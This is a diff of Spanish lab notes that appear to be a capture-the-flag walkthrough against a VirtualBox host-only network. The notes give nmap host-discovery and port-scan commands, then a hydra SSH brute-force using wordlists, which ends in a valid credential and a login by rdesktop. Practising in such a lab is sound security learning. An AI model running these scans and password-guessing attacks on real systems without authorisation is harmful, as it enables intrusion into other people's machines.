@@ -1,6 +1,15 @@
 User.txt
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
 
-ifconfig y vemos cual es la red del entorno, interfaz vboxnet0
-nmap -p- -sS --min-rate 5000 --open -vvv IP 
-nmap -p- --min-rate 5000 --open -vvv IP -oN ports  
-hydra -L users.txt -P pass.txt ssh://IP
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+ 
+Vemos que el puerto 22 esta abierto y con el servicio ssh. Probamos hacer un ataque de fuerza bruta a este servicio:
+    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 
+
+    - hydra -L names.txt -P passwords.txt ssh://IP
+
+Y encontramos una credencial valida. Nos conectamos con rdesktop y ya hemos hecho la intrusión.
